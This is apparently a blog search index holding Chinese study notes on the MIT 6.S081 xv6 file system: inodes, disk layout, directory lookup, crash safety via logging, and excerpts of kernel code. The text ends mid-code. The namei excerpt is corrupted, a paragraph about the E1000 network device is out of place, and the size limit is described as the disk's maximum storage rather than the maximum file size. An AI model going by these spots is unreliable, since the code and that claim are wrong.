<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>File system</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/filesys/fs/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/filesys/fs/</url>
    
    <content type="html"><![CDATA[<ol type="1"><li><p>file abstraction</p></li><li><p>Crash safety：遭遇某种宕机或者突然关机，原文件还存在</p></li><li><p>Disk layout：文件是如何在硬盘上存储的</p></li><li><p>Performance</p><p>持久化的存储设备读取速率通常很慢，需要buffer和concurrency</p></li></ol><h2 id="api-example">API Example</h2><p>fd = open("x/y", _)，文件名是人类可读的</p><p>write(fd, "abc",3)，写入文件的时候，是不存在偏移量的，偏移量是隐式的，需要文件抽象来存储</p><p>link("x/y", "x/z"), 建立链接，相当于对同一个文件有多个命名</p><p>unlink("x/y")，删除之前的引用</p><p>write(fd, "def", 3)，此时仍然可以写入</p><p>所以，fd是和文件名无关的对象，</p><p>存储信息的组织方式不只是本次课的一种，还有很多方法，比如B+,红黑树，但本节课是最简单实现的一种</p><h2 id="inode">Inode</h2><p>Inode &lt;- file info, independent of name</p><p>Inode #(仅仅是个数字)</p><p>对Inode必须有链接计数，当链接计数为0时且打开文件的fd为0时才能删除对应文件，fd必须维护每次写入后的偏移量</p><p>FS layers</p><p><img src="C:\Users\Mmjiang\Desktop\oslearning\mit-6.s081\filesys\fs-layers.png" alt="fs-layers" style="zoom:50%;" /></p><h2 id="storage-device">Storage Device</h2><p>从下面开始讲：</p><ol type="1"><li><p>存储设备</p><p>SSD 和HDD</p></li></ol><p>对于存储设备有个存储划分的概念，且存储设备有对应的分区：扇区(512)和块区(1024B)，这两个是对存储设备不同的划分单位</p><p>CPU &lt;- memory</p><p>write /read PCI(驱动)</p><p>SSD HDD</p><p>disk layout：xv6按照块对磁盘进行划分，一个块1024字节</p><p><img src="C:\Users\Mmjiang\Desktop\oslearning\mit-6.s081\filesys\disk-layout.png" alt="disk-layout" style="zoom:50%;" /></p><p>给定inode，可以计算出在哪个块里，eg:10 -&gt; 32 + 10 * 64 / 1024 =32，所以在编号为32的块中 inode 17呢 =&gt; 33</p><p><img src="C:\Users\Mmjiang\Desktop\oslearning\mit-6.s081\filesys\无标题-2023-08-26-1159.png" alt="无标题-2023-08-26-1159" style="zoom:50%;" /></p><p>block 12可以存放(1024/4 = 256，4是block index大学)个blockindex，所以xv6里硬盘最大存储(256 + 12) * 1024 bytes大小</p><p>如果想要扩展存储最大空间的话，可以加double indirect block index:</p><p>index =&gt; block index =&gt; block index</p><p>eg: 给定字节，怎么知道是哪个inode read(8000) = 8000 / 1024 = 7 8000 %1024 = 832</p><p>由于7小于directindex，所以直接可以查到，然后取偏移量为832处的数据</p><p>目录：xv6中目录即文件</p><p>目录由很多entry组成，每个entry由：entry: inode num(2 bytes) +filename (14 bytes)，</p><p>eg: 查找y/x</p><p>从root inode(1)开始查找，在block 32这里，第64~128(32 + 1 * 64 / 1024= 32, offset = 1*64 % 1024 = 64) =&gt;scans block for name 'y' =&gt;如果是目录然后遍历它的block是寻找文件名为y的entry，其inode为251，继续向下寻找</p><figure><imgsrc="C:\Users\Mmjiang\AppData\Roaming\Typora\typora-user-images\image-20230909201628672.png"alt="image-20230909201628672" /><figcaption aria-hidden="true">image-20230909201628672</figcaption></figure><h2 id="代码演示">代码演示</h2><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">create</span> file<br><span class="hljs-keyword">write</span>: <span class="hljs-number">33</span> (<span class="hljs-keyword">block</span> <span class="hljs-number">33</span>)<br><span class="hljs-keyword">write</span>: <span class="hljs-number">33</span> (filling inode)<br><span class="hljs-keyword">write</span>: <span class="hljs-number">46</span> (data <span class="hljs-keyword">block</span>, root目录的一个块)<br><span class="hljs-keyword">write</span>: <span class="hljs-number">32</span> (update inode <span class="hljs-number">1</span>)<br><span class="hljs-keyword">write</span>: <span class="hljs-number">33</span>  (update <span class="hljs-keyword">new</span> inode)<br><br>hi<br><span class="hljs-keyword">write</span>: <span class="hljs-number">45</span> (bitmap)<br><span class="hljs-keyword">write</span>: <span class="hljs-number">595</span> (<span class="hljs-keyword">write</span> bitmap <span class="hljs-keyword">to</span> <span class="hljs-number">595</span>)<br><span class="hljs-keyword">write</span>: <span class="hljs-number">595</span> (<span class="hljs-keyword">write</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">block</span>)<br><span class="hljs-keyword">write</span>: <span class="hljs-number">33</span> (update <span class="hljs-keyword">new</span> inode)<br><br>\n<br><span class="hljs-keyword">write</span>: <span class="hljs-number">33</span><br><span class="hljs-keyword">write</span>: <span class="hljs-number">33</span><br></code></pre></td></tr></table></figure><p>你可以使用名叫E1000的网络设备处理网络通信。对于xv6来说，E1000看起来像是连接到真实局域网的一块硬件设备。实际上，E1000在quemu中是一种软件模拟的形式。在QEMU模拟的局域网里，xv6作为客户端它的IP地址10.0.2.15，同时还有另一台与之通信的IP为10.0.2.2的主机。当xv6使用E1000给10.0.2.2发送数据包，qemu传递该数据包给合适的应用</p><h2 id="crash-safety">Crash Safety</h2><p>Crash can lead the on-disk fs to be incorrect adn inconsistentstate.</p><p>解决方案：logging</p><h3id="risks-fs-operation-are-multipl-steps-disk-operation.-crash-may-leave-fs-invariants-violated破坏文件系统的不变性">RIsks：fs operation are multipl steps disk operation. crash may leave fsinvariants violated(破坏文件系统的不变性)</h3><p>重启后：crash again, or no crash but w/w data incorrectly</p><p>case: xv6</p><p>bitmap: 用于记录哪些块是空闲的，哪些不是</p><p>echo "hi" &gt; x</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">write</span>: <span class="hljs-number">33</span> (allocate inode <span class="hljs-keyword">for</span> x)<br><span class="hljs-built_in">write</span>: <span class="hljs-number">33</span> (init inode x)<br><span class="hljs-built_in">write</span>: <span class="hljs-number">46</span> (<span class="hljs-built_in">record</span> x <span class="hljs-keyword">in</span> / directory&#x27;s data block)<br><span class="hljs-built_in">write</span>: <span class="hljs-number">32</span> (update root inode)<br><span class="hljs-built_in">write</span>: <span class="hljs-number">33</span>  (update inode x)<br><br>单个文件的创建由多步组成<br><br><br></code></pre></td></tr></table></figure><p><img src="C:\Users\Mmjiang\Desktop\oslearning\mit-6.s081\filesys\write1.png" alt="write1" style="zoom:50%;" /></p><p>可以不看通过调整顺序呢？</p><p>46 32 33 33 33</p><p>可以避免上面的问题，但是会有新的问题，比如在32处发生崩溃，此时OS可见的是未分配的Inode，所以导致该inode后续被用在了其他的文件里，即一个inode被多个文件共享。造成的直观影响是一个用户读写一个文件会影响其他用户。</p><p>45(set alloc bitmap block)</p><p>595(update h to allocate data block)</p><p>595(update i to allocate data block)</p><p>33(size update)</p><p>修改顺序：3345，在33后发生崩溃，size发生改变，但实际大小却不是，且在bitmap中595没有被记录属于当前文件的；所以该block后续也会被分配到其他文件，导致共享。</p><p>出现问题的本质原因在于：fsoperation不是以原子性对磁盘进行操作，并不是由于操作的顺序所导致的。</p><p>解决方法：logging，用日志延迟更新磁盘的操作，将多次写操作组成一个原子性操作，称为事务。</p><ol type="1"><li>atomic fs calls</li><li>fast recovery</li><li>high performance</li></ol><p>(本次课程只提到了write，不涉及文件的append操作)</p><p>磁盘：</p><p>内存：</p><p>有了logging之后，磁盘的更新步骤如下：</p><ol type="1"><li>log writes (不做实际写入操作)</li><li>commit (提交一次事务到磁盘，更新磁盘的logging block)</li><li>install (更新磁盘的data block)</li><li>clean log</li></ol><p>事务帮助多个写入操作成为原子性的，</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl">事务的开始(<span class="hljs-function"><span class="hljs-title">begin_op</span>())</span><br><br>事务的结束(<span class="hljs-function"><span class="hljs-title">end_op</span>())</span><br><br>结束之后才会生成<span class="hljs-variable">commit</span>，<span class="hljs-variable">xv6</span>中的文件系统调用都有这样的代码结构<br></code></pre></td></tr></table></figure><p>bitmap：用于记录哪些data block在被使用中</p><p>三个注意点：</p><ol type="1"><li>bcache不能驱逐</li><li>单次commit不能太大，超过logging block大小，需要分割</li><li>并发的情况下，如果多个事务同时参与commit，如果本次commit的大小太大，需要睡眠部分进程，等待上一个事务结束之后再恢复</li></ol><h2 id="文件系统">文件系统</h2><h3 id="概述">概述</h3><p>出于以下原因，文件系统背后的机制还比较有意思：</p><ul><li>文件系统对硬件的抽象较为有用，所以理解文件系统对于硬件的抽象是如何实现的还是有点意思的。</li><li>除此之外，还有个关键且有趣的地方就是crashsafety。有可能在文件系统的操作过程中，计算机崩溃了，在重启之后你的文件系统仍然能保持完好，文件系统的数据仍然存在，并且你可以继续使用你的大部分文件。如果文件系统操作过程中计算机崩溃了，然后你重启之后文件系统不存在了或者磁盘上的数据变了，那么崩溃的将会是你。所以crashsafety是一个非常重要且经常出现的话题，我们下节课会专门介绍它。</li><li>之后是一个通用的问题，如何在磁盘上排布文件系统。例如目录和文件，它们都需要以某种形式在磁盘上存在，这样当你重启计算机时，所有的数据都能恢复。所以在磁盘上有一些数据结构表示了文件系统的结构和内容。在XV6中，使用的数据结构非常简单，因为XV6是专门为教学目的创建的。真实的文件系统通常会更加复杂。但是它们都是磁盘上保存的数据结构，我们在今天的课程会重点看这部分。</li><li>最后一个有趣的话题是性能。文件系统所在的硬件设备通常都较慢，比如说向一个SSD磁盘写数据将会是毫秒级别的操作，而在一个毫秒内，计算机可以做大量的工作，所以尽量避免写磁盘很重要，我们将在几个地方看到提升性能的代码。比如说，所有的文件系统都有buffercache或者叫blockcache。同时这里会有更多的并发，比如说你正在查找文件路径名，这是一个多次交互的操作，首先要找到文件结构，然后查找一个目录的文件名，之后再去查找下一个目录等等。你会期望当一个进程在做路径名查找时，另一个进程可以并行的运行。这样的并行运行在文件系统中将会是一个大的话题。</li></ul><p>文件系统究竟维护了什么样的结构？</p><ul><li>首先，最重要的可能就是inode，这是代表一个文件的对象，并且它不依赖于文件名。实际上，inode是通过自身的编号来进行区分的，这里的编号就是个整数。所以文件系统内部通过一个数字，而不是通过文件路径名引用inode。同时，基于之前的讨论，inode必须有一个linkcount来跟踪指向这个inode的文件名的数量。一个文件（inode）只能在linkcount为0的时候被删除。实际的过程可能会更加复杂，实际中还有一个openfdcount，也就是当前打开了文件的文件描述符计数。一个文件只能在这两个计数器都为0的时候才能被删除。</li></ul><p>文件系统中核心的数据结构就是inode和filedescriptor。后者主要与用户进程进行交互。</p><p>尽管文件系统的API很相近并且内部实现可能非常不一样。但是很多文件系统都有类似的结构。因为文件系统还挺复杂的，所以最好按照分层的方式进行理解(图3-2)。可以这样看：</p><ul><li>在最底层是磁盘，也就是一些实际保存数据的存储设备，正是这些设备提供了持久化存储。</li><li>在这之上是buffer cache或者说blockcache，这些cache可以避免频繁的读写磁盘。这里我们将磁盘中的数据保存在了内存中。</li><li>为了保证持久性，再往上通常会有一个logging层。许多文件系统都有某种形式的logging，我们下节课会讨论这部分内容，所以今天我就跳过它的介绍。</li><li>在logging层之上，XV6有inodecache，这主要是为了同步（synchronization），我们稍后会介绍。inode通常小于一个diskblock，所以多个inode通常会打包存储在一个diskblock中。为了向单个inode提供同步操作，XV6维护了inode cache。</li><li>再往上就是inode本身了。它实现了read/write。</li><li>再往上，就是文件名，和文件描述符操作。</li></ul><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQ0YjFkYzFlNDg4NTk4NDIyMDc3NTBhNjM3ZDgwZmFfZXBqRmJIeWp4d2x5V3dpODBKcVZpYTliVXpYSkIzSEVfVG9rZW46SHlDRmJFb1hHb01GSDl4a3Q2N2NoOHRqbnpmXzE2OTY1NzQ1OTc6MTY5NjU3ODE5N19WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>(图3-1: filesystem layering)</p><h3 id="inode-1">inode</h3><p>当今的Unix文件系统(Unix File System, UFS)起源于Berkeley Fast FileSystem。和所有的文件系统一样，Unix文件系统是以块(Block)为单位对磁盘进行读写的。一般而言，一个块的大小为512bytes或者1024bytes。文件系统的所有数据结构都以块为单位存储在硬盘上，一些典型的数据块包括：</p><ul><li>Superblock：Superblock包含了关于整个文件系统的元信息(metadata)，比如文件系统的类型、大小、状态和关于其他文件系统数据结构的信息。Superblock对文件系统是非常重要的，因此Unix文件系统的实现会保存多个Superblock的副本。</li><li>Inodeblock：inode是Unix文件系统中用于表示文件的抽象数据结构。inode不仅是指抽象了一组硬盘上的数据的”文件”，目录和外部IO设备等也会用inode数据结构来表示。inode包含了一个文件的元信息，比如拥有者、访问权限、文件类型等等。对于一个文件系统里的所有文件，文件系统会维护一个inode列表，这个列表可能会占据一个或者多个磁盘块（见下图3-1）。</li><li>Data block：Datablock用于存储实际的文件数据。一些文件系统中可能会存在用于存放目录的DirectoryBlock和IndirectionBlock，但是在Unix文件系统中这些文件块都被视为数据，上层文件系统通过inode对其加以操作，他们唯一的区别是inode里记录的属性有所不同。</li><li>Directory block</li><li>Indirection block</li></ul><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=MmZmY2I0ZDgxYjE4MTNiMzQ0NGU1ZGM3ODM1YzJkMzJfSERudVhNNjVQRlZYeE1xRUVIN1lQVVhoUjNJTXJRRWhfVG9rZW46VVhwamJOS1NRb0NyQzF4MElyU2N2cGxlblpnXzE2OTY1NzQ1OTc6MTY5NjU3ODE5N19WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>(3-2: inode)</p><p>block 12可以存放(1024/4 = 256，4是block index本身大小)个blockindex，所以xv6里硬盘最大存储(256 + 12) * 1024 bytes大小</p><p>如果想要扩展存储最大空间的话，可以加double indirect block index</p><h3id="存储设备与硬盘上的文件系统布局">存储设备与硬盘上的文件系统布局</h3><p>通常来说，xv6的硬件上文件布局如下：</p><ul><li>block0要么没有用，要么被用作boot sector来启动操作系统。</li><li>block1通常被称为superblock，它描述了文件系统。它可能包含磁盘上有多少个block共同构成了文件系统这样的信息。我们之后会看到XV6在里面会存更多的信息，你可以通过block1构造出大部分的文件系统信息。</li><li>在XV6中，log从block2开始，到block32结束。实际上log的大小可能不同，这里在superblock中会定义log就是30个block。</li><li>接下来在block32到block45之间，XV6存储了inode。我之前说过多个inode会打包存在一个block中，一个inode是64字节。</li><li>之后是bitmapblock，这是我们构建文件系统的默认方法，它只占据一个block。它记录了数据block是否空闲。</li><li>之后就全是数据block了，数据block存储了文件的内容和目录的内容。</li></ul><p>通常来说，bitmap block，inode blocks和log blocks被统称为metadatablock。它们虽然不存储实际的数据，但是它们存储了能帮助文件系统完成工作的元数据。</p><blockquote><p>学生提问：boot block是不是包含了操作系统启动的代码？</p><p>Frans教授：完全正确，它里面通常包含了足够启动操作系统的代码。之后再从文件系统中加载操作系统的更多内容。</p><p>学生提问：所以XV6是存储在虚拟磁盘上？</p><p>Frans教授：在QEMU中，我们实际上走了捷径。QEMU中有个标志位-kernel，它指向了内核的镜像文件，QEMU会将这个镜像的内容加载到了物理内存的0x80000000。所以当我们使用QEMU时，我们不需要考虑bootsector。</p><p>学生提问：所以当你运行QEMU时，你就是将程序通过命令行传入，然后直接就运行传入的程序，然后就不需要从虚拟磁盘上读取数据了？</p><p>Frans教授：完全正确。</p></blockquote><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=YmZjODk4YzY2YmVjMGFmZjU4ZTk5YzRiYWI5N2M0ZDFfakV5eWFEMnhONEROUmdKYVMwRGszeDRmZ2FibmJUMnZfVG9rZW46T3pmaWJzdUxSb1N4aFJ4RDBuR2NZMzNwbkc5XzE2OTY1NzQ1OTc6MTY5NjU3ODE5N19WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>给定字节，怎么知道是哪个inode？ read(8000) = 8000 / 1024 = 7 8000 %1024 = 832</p><p>由于7小于directindex，所以直接可以查到，然后取偏移量为832处的数据。</p><p><strong>目录</strong>：xv6中目录即文件</p><p>目录由很多entry组成，每个entry由：entry: inode num(2 bytes) +filename (14 bytes)，</p><p>eg: 查找y/x</p><p>从root inode(1)开始查找，在block 32这里，第64~128(32 + 1 * 64 / 1024= 32, offset = 1*64 % 1024 = 64) =&gt;scans block for name 'y' =&gt;如果是目录然后遍历它的block是寻找文件名为y的entry，其inode为251，继续向下寻找。</p><h3 id="代码">代码</h3><p>下面以open为例看下大致的与磁盘交互的过程：</p><h4 id="sys_open">sys_open</h4><p>首先是sys_open函数：就是参数校验调用begin_op</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_open</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> path[MAXPATH];<br>  <span class="hljs-type">int</span> fd, omode;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file</span> *f;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span> *ip;<br>  <span class="hljs-type">int</span> n;<br><br>  <span class="hljs-keyword">if</span>((n = <span class="hljs-built_in">argstr</span>(<span class="hljs-number">0</span>, path, MAXPATH)) &lt; <span class="hljs-number">0</span> || <span class="hljs-built_in">argint</span>(<span class="hljs-number">1</span>, &amp;omode) &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-built_in">begin_op</span>();<br><br>  <span class="hljs-keyword">if</span>(omode &amp; O_CREATE)&#123;<br>    ip = <span class="hljs-built_in">create</span>(path, T_FILE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(ip == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-built_in">end_op</span>();<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span>((ip = <span class="hljs-built_in">namei</span>(path)) == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-built_in">end_op</span>();<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">ilock</span>(ip);<br>    <span class="hljs-keyword">if</span>(ip-&gt;type == T_DIR &amp;&amp; omode != O_RDONLY)&#123;<br>      <span class="hljs-built_in">iunlockput</span>(ip);<br>      <span class="hljs-built_in">end_op</span>();<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h4 id="begin_op">begin_op</h4><p>判断是否已经处于committingstatus，如果是则睡眠，除此之外日志太大也睡眠</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// file.c</span><br><br><span class="hljs-comment">// called at the start of each FS system call.</span><br><span class="hljs-function"><span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">begin_op</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">acquire</span>(&amp;log.lock);<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">if</span>(log.committing)&#123;<br>      <span class="hljs-built_in">sleep</span>(&amp;log, &amp;log.lock);<br>      <span class="hljs-comment">// MAXOPBLOCKS为10，为什么呢？</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(log.lh.n + (log.outstanding+<span class="hljs-number">1</span>)*MAXOPBLOCKS &gt; LOGSIZE)&#123;<br>      <span class="hljs-comment">// this op might exhaust log space; wait for commit.</span><br>      <span class="hljs-built_in">sleep</span>(&amp;log, &amp;log.lock);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      log.outstanding += <span class="hljs-number">1</span>;<br>      <span class="hljs-built_in">release</span>(&amp;log.lock);<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="create">Create</h4><p>接下来是create函数：主要就是查找父级目录，查找文件是否存在，如果存在直接返回，否则调用ialloc分配空间</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// fs.c</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span>*<br><span class="hljs-built_in">namei</span>(<span class="hljs-type">char</span> *path)<br>&#123;<br>  <span class="hljs-type">char</span> name[<span class="hljs-function">DIRSIZ</span><br><span class="hljs-function">  <span class="hljs-keyword">return</span> <span class="hljs-title">namex</span><span class="hljs-params">(path, <span class="hljs-number">0</span>, name)</span></span>;<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span>*<br><span class="hljs-built_in">nameiparent</span>(<span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *name)<br>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">namex</span>(path, <span class="hljs-number">1</span>, name); <span class="hljs-comment">// 默认从1，root目录开始</span><br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span>*<br><span class="hljs-built_in">namex</span>(<span class="hljs-type">char</span> *path, <span class="hljs-type">int</span> nameiparent, <span class="hljs-type">char</span> *name) <span class="hljs-comment">// nameiparent是父级目录的inode编号</span><br>&#123;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span> *ip, *next;<br><br>  <span class="hljs-keyword">if</span>(*path == <span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-comment">// 如果创建目录是root</span><br>    ip = <span class="hljs-built_in">iget</span>(ROOTDEV, ROOTINO);<br>  <span class="hljs-keyword">else</span> <br>    ip = <span class="hljs-built_in">idup</span>(<span class="hljs-built_in">myproc</span>()-&gt;cwd); <span class="hljs-comment">// 获取当前所在目录，如果是在/下创建的，就是/的inode num</span><br><br>  <span class="hljs-keyword">while</span>((path = <span class="hljs-built_in">skipelem</span>(path, name)) != <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-built_in">ilock</span>(ip);<br>    <span class="hljs-keyword">if</span>(ip-&gt;type != T_DIR)&#123;<br>      <span class="hljs-built_in">iunlockput</span>(ip);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(nameiparent &amp;&amp; *path == <span class="hljs-string">&#x27;\0&#x27;</span>)&#123;<br>      <span class="hljs-comment">// Stop one level early.</span><br>      <span class="hljs-built_in">iunlock</span>(ip);<br>      <span class="hljs-keyword">return</span> ip;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((next = <span class="hljs-built_in">dirlookup</span>(ip, name, <span class="hljs-number">0</span>)) == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-built_in">iunlockput</span>(ip);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">iunlockput</span>(ip);<br>    ip = next;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(nameiparent)&#123;<br>    <span class="hljs-built_in">iput</span>(ip);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> ip; <span class="hljs-comment">// 返回/(父级)的inode</span><br>&#125;<br><br><span class="hljs-comment">// Look for a directory entry in a directory.</span><br><span class="hljs-comment">// If found, set *poff to byte offset of entry.</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span>*<br><span class="hljs-built_in">dirlookup</span>(<span class="hljs-keyword">struct</span> inode *dp, <span class="hljs-type">char</span> *name, uint *poff)<br>&#123;<br>  uint off, inum;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dirent</span> de; <br><br>  <span class="hljs-keyword">if</span>(dp-&gt;type != T_DIR)<br>    <span class="hljs-comment">// 父级目录不是目录</span><br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;dirlookup not DIR&quot;</span>);<br>  <span class="hljs-comment">// de是16byte，对应一个entry的大小</span><br>  <span class="hljs-keyword">for</span>(off = <span class="hljs-number">0</span>; off &lt; dp-&gt;size; off += <span class="hljs-built_in">sizeof</span>(de))&#123;<br>    <span class="hljs-comment">// dir entry</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">readi</span>(dp, <span class="hljs-number">0</span>, (uint64)&amp;de, off, <span class="hljs-built_in">sizeof</span>(de)) != <span class="hljs-built_in">sizeof</span>(de))<br>      <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;dirlookup read&quot;</span>);<br>    <span class="hljs-keyword">if</span>(de.inum == <span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">namecmp</span>(name, de.name) == <span class="hljs-number">0</span>)&#123; <br>      <span class="hljs-comment">// entry matches path 